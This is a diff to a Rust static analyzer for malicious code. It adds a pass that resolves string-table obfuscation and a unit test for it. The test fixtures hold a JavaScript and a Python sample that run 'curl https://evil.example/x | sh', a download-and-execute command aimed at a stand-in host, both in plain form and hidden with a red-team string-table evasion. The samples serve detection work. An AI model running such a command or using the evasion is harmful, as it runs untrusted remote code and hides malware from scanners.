@@ -8,7 +8,7 @@
 
 use crate::lexer::{
     decoded_strings, joined_literals, lex, reversed_literals, strip_shell_comments, unescape_code,
-    with_decoded, with_reversed, Lang, TokKind, Token,
+    with_decoded, with_reversed, with_tables, Lang, TokKind, Token,
 };
 use regex::{Regex, RegexSet};
 use std::cell::OnceCell;
@@ -559,7 +559,8 @@ fn analyze_source(text: &str, lang: Lang, fa: &mut FileAnalysis, depth: u32) {
     let revs = reversed_literals(&dec, lang);
     let unrev = with_reversed(&dec, &revs);
     let joins = joined_literals(&unrev, lang);
-    let toks = with_reversed(&unrev, &joins);
+    let joined = with_reversed(&unrev, &joins);
+    let toks = with_tables(&joined, lang);
     let runs = fold_runs(&toks, lang);
     if runs.is_empty() {
         let skip = nested_code(&toks, lang, fa, depth);
@@ -1725,6 +1726,23 @@ mod tests {
         assert_eq!(decode_base64_text("not base64 at all!", false), None);
         assert_eq!(decode_base64_text("aGk=", false), None);
         assert_eq!(decode_base64_text("AAECAwQFBgcICQoLDA0ODw==", false), None);
+    }
+
+    #[test]
+    fn table_reads_are_read_in_place() {
+        // The red team's string_table evasion: every literal moved into one array.
+        let plain = js("require('child_process').exec('curl https://evil.example/x | sh');\n");
+        let table = js(
+            "var _s = [\"child_process\", \"curl https://evil.example/x | sh\"];\n\
+                        require(_s[0]).exec(_s[1]);\n",
+        );
+        assert!(plain[PROC_EXEC] >= 1 && plain[URL] == 1);
+        assert_eq!(table, plain);
+        let plain = py("import os\nos.system('curl https://evil.example/x | sh')\n");
+        let table = py("_s = ['os', 'curl https://evil.example/x | sh']\n\
+                        __import__(_s[0]).system(_s[1])\n");
+        assert!(table[PROC_EXEC] >= 1 && table[URL] == 1);
+        assert_eq!(table[NETWORK], plain[NETWORK]);
     }
 
     #[test]
